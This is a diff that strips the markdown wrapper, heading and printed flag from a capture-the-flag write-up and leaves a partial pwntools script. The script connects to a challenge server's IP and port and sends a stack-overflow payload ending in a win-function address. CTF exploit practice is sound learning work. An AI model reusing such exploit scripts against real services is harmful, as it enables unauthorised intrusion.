@@ -1,10 +1,3 @@
-# **Stack Architecture - PWN CTF Challenge**
-
-### ***Exploitation***
----
-
-
-```
 from pwn import *
 
 r = remote('45.122.249.68', 10018)
@@ -29,14 +22,3 @@ payload += p32(win)
 
 r.sendline(payload)
 r.interactive()
-
-```
-
-![flag](images/flag.png)
-
-> **FLAG: Wanna.One{neu_ban_chinh_phuc_duoc_chinh_minh_ban_co_the_chinh_phuc_duoc_the_gioi}**
-
-
-
-
-
